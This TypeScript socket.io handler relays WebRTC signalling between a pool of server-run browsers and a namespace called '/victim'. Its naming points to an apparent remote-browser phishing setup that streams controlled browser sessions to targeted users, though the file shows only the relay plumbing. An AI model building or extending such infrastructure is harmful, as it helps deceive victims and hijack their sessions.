import type { Namespace, Socket } from 'socket.io';
import { BrowserPoolManager } from '../../services/BrowserPoolManager.js';
import { logger } from '../../utils/logger.js';

export function setupBrowserNamespace(
  namespace: Namespace,
  browserPoolManager: BrowserPoolManager
): void {
  namespace.on('connection', (socket: Socket) => {
    const browserId = socket.handshake.query.browserId as string;
    if (!browserId) {
      logger.warn(`Browser connected without browserId: ${socket.id}`);
      socket.disconnect();
      return;
    }

    const browser = browserPoolManager.getBrowser(browserId);
    if (!browser) {
      logger.warn(`Browser ${browserId} not found for socket ${socket.id}`);
      socket.disconnect();
      return;
    }

    // Join browser room
    socket.join(browserId);
    browser.socketId = socket.id;

    logger.info(`Browser connected: ${socket.id} (browserId: ${browserId})`);

    // Emit browser ready
    socket.emit('browser:ready', { browserId });

    // Handle webrtc:start event (triggered when victim connects)
    socket.on('webrtc:start', (data: { viewerId: string }) => {
      logger.info(`Browser ${browserId} received webrtc:start for viewer ${data.viewerId}`);
      // This will trigger the broadcast page to create an offer
      // The broadcast script listens for this event
    });

    // Handle WebRTC offer from browser
    socket.on('webrtc:offer', (data: { viewerId: string; offer: unknown }) => {
      logger.debug(`Browser ${browserId} sent WebRTC offer for viewer ${data.viewerId}`);
      // Forward to victim namespace
      namespace.server.of('/victim').to(data.viewerId).emit('webrtc:offer', {
        browserId,
        offer: data.offer,
      });
    });

    // Handle WebRTC answer from browser
    socket.on('webrtc:answer', (data: { viewerId: string; answer: unknown }) => {
      logger.debug(`Browser ${browserId} sent WebRTC answer for viewer ${data.viewerId}`);
      // Forward to victim namespace
      namespace.server.of('/victim').to(data.viewerId).emit('webrtc:answer', {
        browserId,
        answer: data.answer,
      });
    });

    // Handle ICE candidates from browser
    socket.on('webrtc:candidate', (data: { viewerId: string; candidate: unknown }) => {
      logger.debug(`Browser ${browserId} sent ICE candidate for viewer ${data.viewerId}`);
      // Forward to victim namespace
      namespace.server.of('/victim').to(data.viewerId).emit('webrtc:candidate', {
        browserId,
        candidate: data.candidate,
      });
    });

    // Handle disconnect
    socket.on('disconnect', () => {
      logger.info(`Browser disconnected: ${socket.id} (browserId: ${browserId})`);
      browser.socketId = null;
    });
  });
}

